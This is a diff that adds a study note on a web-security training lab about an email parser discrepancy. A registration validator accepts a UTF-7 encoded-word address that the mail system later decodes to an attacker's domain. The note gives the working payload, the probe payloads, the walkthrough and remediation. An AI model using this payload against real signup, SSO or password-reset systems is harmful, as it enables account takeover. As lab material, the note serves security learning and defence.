@@ -3800,3 +3800,394 @@ Seen in:
 ## Golden Rule
 
 > If the server assumes, attackers abuse.
+
+---
+
+# 🧠Lab-14 Business Logic Vulnerability - Email Parser Discrepancy
+
+---
+
+## 🔵 Overview
+
+This lab is based on:
+
+different components interpreting the same email differently
+
+Core issue:
+
+parser discrepancy between validation system and mail system
+
+---
+
+## 🎯 Final Goal
+
+Exploit encoding mismatch to:
+
+bypass email domain restriction
+        ↓
+register account
+        ↓
+receive verification email on attacker domain
+        ↓
+login
+        ↓
+delete carlos
+
+---
+
+## 🔵 WHAT IS THE TOPIC?
+
+| Concept | Meaning |
+|---|---|
+| Business Logic Vulnerability | flaw in application workflow |
+| Email Parser Discrepancy | different interpretation of email |
+| Encoded-Word Format | special email encoding |
+| UTF-7 Encoding | hidden character encoding |
+| Access Control Bypass | domain restriction bypass |
+
+---
+
+## 🔵 THEORY (IMPORTANT FOUNDATION)
+
+### 1 — Business Logic Vulnerability
+
+Occurs when:
+
+application logic can be tricked into unintended behavior
+
+Not code bug — but workflow flaw.
+
+---
+
+### 2 — Email Validation Logic
+
+Application checks:
+
+email must end with @ginandjuice.shop
+
+So:
+
+✔ allowed:
+
+```text
+user@ginandjuice.shop
+```
+
+❌ blocked:
+
+```text
+user@evil.com
+```
+
+---
+
+### 3 — Parser Discrepancy
+
+Two systems:
+
+| System | Behavior |
+|---|---|
+| Validator | reads RAW input |
+| Mail system | decodes input |
+
+👉 mismatch = vulnerability
+
+---
+
+### 4 — Email Encoding
+
+Email can contain encoded data:
+
+```text
+=?charset?q?encoded_text?=
+```
+
+Used for:
+
+special characters
+
+non-standard text
+
+---
+
+### 5 — UTF-7 Encoding (Key Concept)
+
+Rare encoding that hides characters like:
+
+```text
+@
+spaces
+```
+
+Example:
+
+```text
+&AEA- = @
+```
+
+---
+
+## 🔥 WHY ATTACK WORKS
+
+Because:
+
+validator does NOT decode UTF-7
+
+mail system DOES decode UTF-7
+
+---
+
+## 🔵 LAB WALKTHROUGH (STEP BY STEP)
+
+---
+
+### ✅ Step 1 — Open Registration Page
+
+Go to:
+
+```text
+Register
+```
+
+---
+
+### ✅ Step 2 — Test Domain Restriction
+
+Try:
+
+```text
+foo@exploit-server.net
+```
+
+❌ Blocked
+
+Reason:
+
+only @ginandjuice.shop allowed
+
+---
+
+### ✅ Step 3 — Test Encoded Payloads
+
+#### ISO-8859-1
+
+```text
+=?iso-8859-1?q?=61=62=63?=foo@ginandjuice.shop
+```
+
+❌ Blocked
+
+---
+
+#### UTF-8
+
+```text
+=?utf-8?q?=61=62=63?=foo@ginandjuice.shop
+```
+
+❌ Blocked
+
+---
+
+#### UTF-7 (IMPORTANT DISCOVERY)
+
+```text
+=?utf-7?q?&AGEAYgBj-?=foo@ginandjuice.shop
+```
+
+✔ Accepted
+
+---
+
+### ✅ Step 4 — Craft Final Payload
+
+```text
+=?utf-7?q?attacker&AEA-exploit-0ab500350305881683069506012f0032.exploit-server.net&ACA-?=@ginandjuice.shop
+```
+
+![final_payload](../images/final-utf7-email-payload.png)
+
+---
+
+## 🔵 PAYLOAD BREAKDOWN
+
+---
+
+### Part 1
+
+```text
+=?utf-7?q?
+```
+
+→ tells system to decode UTF-7
+
+---
+
+### Part 2
+
+```text
+attacker
+```
+
+username part
+
+---
+
+### Part 3
+
+```text
+&AEA-
+```
+
+→ decoded = @
+
+---
+
+### Part 4
+
+```text
+exploit-server domain
+```
+
+your controlled mailbox
+
+---
+
+### Part 5
+
+```text
+&ACA-
+```
+
+→ space
+
+---
+
+### Part 6
+
+```text
+?=@ginandjuice.shop
+```
+
+fake validation suffix
+
+---
+
+## 🔵 EXECUTION FLOW
+
+```text
+User submits encoded email
+        ↓
+Validator reads RAW input
+        ↓
+Sees @ginandjuice.shop → PASS
+        ↓
+Account created
+        ↓
+Mail system decodes UTF-7
+        ↓
+Real email becomes attacker-controlled
+        ↓
+Verification email sent to exploit server
+```
+
+---
+
+## 🔵 ACCOUNT USAGE FLOW
+
+---
+
+### ✅ Step 5 — Click Email Verification
+
+activation email arrives at exploit server
+
+---
+
+### ✅ Step 6 — Activate Account
+
+Click link → account verified
+
+---
+
+### ✅ Step 7 — Login
+
+Use:
+
+```text
+username + password you created during signup
+```
+
+---
+
+### ✅ Step 8 — Admin Access
+
+Now account is trusted
+
+---
+
+### ✅ Step 9 — Delete Carlos
+
+```text
+admin → delete user → carlos
+```
+
+---
+
+## 🔵 REAL-WORLD SCENARIOS
+
+```text
+enterprise registration portals
+
+SaaS onboarding systems
+
+SSO email-based login
+
+invitation-only systems
+
+admin auto-assignment based on domain
+```
+
+---
+
+## 🔵 HIGH-VALUE TARGETS
+
+| System | Impact |
+|---|---|
+| Admin registration | privilege escalation |
+| SSO onboarding | account takeover |
+| invite systems | bypass access |
+| password reset flows | email hijack |
+
+---
+
+## 🔵 REMEDIATION
+
+```text
+normalize email before validation
+
+reject all encoded-word formats
+
+disable UTF-7 support
+
+use one canonical parser everywhere
+
+never trust raw email strings
+```
+
+---
+
+## 🔵 IMPORTANT MENTAL MODEL
+
+```text
+Validation parser and mail parser interpret
+the same email differently.
+
+That mismatch:
+creates authentication and access-control bypasses.
+```
+
+---
+
+## 🔵 ONE-LINE SUMMARY
+
+👉 “This vulnerability works because the application validates the raw UTF-7 encoded email while the mail system later decodes it differently, allowing attackers to bypass domain restrictions and receive emails on a controlled domain.”
